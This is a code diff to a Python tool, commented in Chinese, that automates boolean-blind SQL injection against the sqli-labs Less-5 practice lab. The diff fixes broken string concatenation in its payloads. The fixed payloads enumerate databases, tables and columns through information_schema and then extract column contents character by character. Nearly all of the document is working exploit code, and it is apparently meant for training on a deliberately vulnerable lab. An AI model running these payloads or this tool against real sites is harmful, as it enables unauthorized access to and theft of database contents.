@@ -1,8 +1,9 @@
+#!/usr/bin/env python3
 u"""基于bool盲注的SQL自动化注入工具."""
 
 import requests
 
-url = "http://127.0.0.1/sqli-labs/Less-5/"  # 页面url值
+url = "http://192.168.1.103/sqli-labs/Less-5/"  # 页面url值
 parameter = "?id="  # 参数
 echo = "You are in"  # 页面回显值
 database_name = ""
@@ -57,8 +58,8 @@ def bin_search(distance, char_index, payload, left=0, right=127):
 
 def search_db():
     u"""找到所有数据库."""
-    payload = "1' and ascii(substr((select SCHEMA_NAME from"
-    "INFORMATION_SCHEMA.SCHEMATA limit {0},1),{1},1))>{2}%23"
+    payload = ("1' and ascii(substr((select SCHEMA_NAME from "
+               "INFORMATION_SCHEMA.SCHEMATA limit {0},1),{1},1))>{2}%23")
     search("database", payload)
 
 
@@ -67,9 +68,9 @@ def search_table():
     global database_name
     database_name = input("please input database_name:\n")
 
-    payload = "1' and ascii(substr((select table_name from "
-    "information_schema.tables where table_schema='"
-    + database_name + "' limit {0},1),{1},1))>{2} %23"
+    payload = ("1' and ascii(substr((select table_name from "
+               "information_schema.tables where table_schema='"
+               + database_name + "' limit {0},1),{1},1))>{2} %23")
     search("table", payload)
 
 
@@ -78,9 +79,10 @@ def search_column():
     global table_name
     global database_name
     table_name = input("please input table_name:\n")
-    payload = "1' and ascii(substr((select column_name from "
-    "information_schema.columns  where table_name='" + table_name
-    + "' and table_schema='" + database_name + "' limit {0},1),{1},1))>{2} %23"
+    payload = ("1' and ascii(substr((select column_name from "
+               "information_schema.columns  where table_name='" + table_name
+               + "' and table_schema='" + database_name
+               + "' limit {0},1),{1},1))>{2} %23")
     search("column", payload)
 
 
@@ -89,8 +91,9 @@ def get_content():
     global table_name
     global database_name
     column_name = input("please input column_name:\n")
-    payload = "1' and ascii(substr((select " + column_name + " from "
-    + database_name + "." + table_name + " limit {0},1),{1},1))>{2} %23"
+    payload = ("1' and ascii(substr((select " + column_name + " from "
+               + database_name + "." + table_name
+               + " limit {0},1),{1},1))>{2} %23")
     search("content", payload)
 
 
